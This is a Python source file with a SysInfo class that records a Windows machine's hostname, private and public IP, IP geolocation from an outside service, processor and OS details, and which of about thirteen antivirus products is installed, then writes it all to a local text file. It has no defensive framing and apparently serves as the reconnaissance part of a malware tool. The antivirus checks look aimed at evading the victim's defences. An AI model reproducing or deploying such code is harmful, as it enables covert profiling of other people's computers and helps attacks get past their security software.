import os,socket, requests as re, platform

class SysInfo:
    def __init__(self):
        self.file_path = os.getcwd() + "\\" + "sysInfo.txt" 
 
    def computer_information(self):
        with open(self.file_path, "a") as f:
            hostname = socket.gethostname()
            Ipaddr = socket.gethostbyname(hostname)

            try:
                publicIp = re.get("https://api.ipify.org").text
                f.write("Public IP :" + publicIp)
                
                response = re.get("http://ip-api.com/json/"+ publicIp).json()
                for ip_info in response:
                    f.write("IP ADDRESS information")
                    f.write( "\n"+ ip_info + " = " + str(response[ip_info]) + "\n")

                if os.path.exists('C:\\Program Files\\Windows Defender'):
                    f.write("Win Def Mod" + 'Windows Defender')
                elif os.path.exists('C:\\Program Files\\AVAST Software\\Avast'):
                    f.write("Win Def Mod" + 'Avast')
                elif os.path.exists('C:\\Program Files\\AVG\\Antivirus'):
                    f.write("Win Def Mod" + 'AVG')
                elif os.path.exists('C:\\Program Files\\Avira\\Launcher'):
                    f.write("Win Def Mod" + 'Avira')
                elif os.path.exists('C:\\Program Files\\IObit\\Advanced SystemCare'):
                    f.write("Win Def Mod" + 'Advanced SystemCare')
                elif os.path.exists('C:\\Program Files\\Bitdefender Antivirus Free'):
                    f.write("Win Def Mod" + 'Bitdefender')
                elif os.path.exists('C:\\Program Files\\COMODO\\COMODO Internet Security'):
                    f.write("Win Def Mod" + 'Comodo')
                elif os.path.exists('C:\\Program Files\\DrWeb'):
                    f.write("Win Def Mod" + 'Dr.Web')
                elif os.path.exists('C:\\Program Files\\ESET\\ESET Security'):
                    f.write("Win Def Mod" + 'ESET')
                elif os.path.exists('C:\\Program Files\\GRIZZLY Antivirus'):
                    f.write("Win Def Mod" + 'Grizzly Pro')
                elif os.path.exists('C:\\Program Files\\Kaspersky Lab'):
                    f.write("Win Def Mod" + 'Kaspersky')
                elif os.path.exists('C:\\Program Files\\IObit\\IObit Malware Fighter'):
                    f.write("Win Def Mod" + 'Malware fighter')
                elif os.path.exists('C:\\Program Files\\360\\Total Security'):
                    f.write("Win Def Mod" + '360 Total Security')
                else:
                    pass

            except Exception:
                f.write("Could'nt get public address")

            f.write("Procesor : " + platform.processor() + '\n' )
            f.write("System Information : " + platform.system() + "\n" + "Platform Version : " + platform.version() + "\n")
            f.write("Machine : "+ platform.machine() + "\n")
            f.write("Hostname" + hostname + "\n")
            f.write("\n" + "Private Ip Address" + Ipaddr + "\n")
